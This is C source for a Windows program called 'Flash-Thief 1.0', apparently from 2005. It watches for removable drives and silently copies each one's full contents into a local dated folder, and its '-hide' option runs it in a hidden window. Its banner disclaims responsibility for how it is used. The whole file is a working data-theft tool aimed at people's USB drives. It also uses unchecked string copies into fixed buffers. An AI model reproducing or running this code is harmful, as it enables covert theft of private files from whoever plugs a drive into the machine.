#include "windows.h"
#include "stdio.h"
#include "string.h"
#include "direct.h"
char dir[260];

void Copy( char* FileName )

{

        char dir2[260];
         strcpy( dir2 , dir );

        //从全路径提取出文件名

         char* temp = strchr(FileName,'\\');
         temp++;

         strcat(dir2 , temp );

         CopyFile( FileName , dir2 , 1 );
}

void CreateDir( char * path )

{

         char temp2[260];strcpy( temp2 , dir );

         char* temp = strchr( path , '\\');

         temp++;

         strcat(temp2 , temp );

         mkdir( temp2 );
}

void GetFile( char* FilePath )

{

         char temp[260],temp1[260];

         strcpy( temp ,FilePath );

         WIN32_FIND_DATA FindFileData;

         HANDLE hFind;

         strcat( temp , "*");

         //printf("%s",temp);

         hFind = FindFirstFile( temp , &FindFileData );
         //printf("%s\n",FindFileData.cFileName );

         if ( hFind == INVALID_HANDLE_VALUE )

         {

                //printf ("Invalid File Handle. GetLastError reports %d\n", GetLastError ());

                //exit(0);

         }

         else

         {

                //printf("%s",temp1);

                       do

                       {

                              strcpy( temp1 , FilePath );

                              strcat( temp1 , FindFileData.cFileName );

                              if(strcmp( FindFileData.cFileName , "." )!=0&&strcmp( FindFileData.cFileName , ".." )!=0)

                              {

                                     if( FindFileData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY )

                                     {

                                                   strcat( temp1 , "\\" );

                                                   CreateDir( temp1 );

                                                   GetFile( temp1 );

                                     }
                                     else
                                     {
                                            //printf("%s\n",temp1 );
                                            Copy( temp1 );
                                     }
                              }
                       }while( FindNextFile( hFind,&FindFileData ) );
         }
         FindClose(hFind);
}

int CheckDisk(char *disk)
{
         if(GetDriveType(disk)==DRIVE_REMOVABLE)return 0;
         return -1;
}

int Steal()
{
         char buf[10];
         DWORD lod=GetLogicalDrives();
         if (lod!=0)
         {
         for (int i=0;i<26;i++)
        {
               if ((lod & 1)==1)
               {
                      sprintf(buf,"%c",'A'+i);
                      strcat(buf,":\\");
                      if(!CheckDisk(buf))
                      {
                             //现在判断驱动是否准备就绪～
                             if(GetVolumeInformation(buf,0,0,0,0,0,0,0))
                             {
                                    GetFile(buf);//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
                                    //GetFile("j:\\a\\");
                             }
                      }
               }
               lod=lod>>1;
        }

}

         return 0;

}

int main(int argc, char* argv[])

{

                SYSTEMTIME st;

                char dtime[20],temp[10];

                GetLocalTime( &st );

                itoa( st.wYear ,temp , 10 );

                strcpy( dtime , temp );

                itoa( st.wMonth ,temp , 10 );

                strcat( dtime , temp );

                itoa( st.wDay ,temp , 10 );

                strcat( dtime , temp );

                mkdir( dtime );

                getcwd( dir , 260 );

                strcat( dir , "\\");

                strcat( dir , dtime );

                strcat( dir , "\\" );

         if(argc!=2)

         {

                printf("\n Flash-Thief 1.0 by lake2 ( http://lake2.126.com )    \n");

                printf("Date: \t2005-5-28\n");

                printf("You can quit this program with Ctrl + C \nand you can run it in hide mode with \'-hide\'    \n");

                printf("It's nothing with me whatever you do ! \n");

                printf("Running.......\n");

                while(1)

                {

                       Steal();

                       Sleep(30000);

                }

         }

         else

         {

                if(strcmp( argv[1] , "-hide" )==0){printf("It's nothing with me whatever you do ! \n");ShellExecute( 0, "open", argv[0], NULL, NULL, SW_HIDE );}

                else

                       printf("Parameter %s is invalid",argv[1]);

         }

         return 0;

}
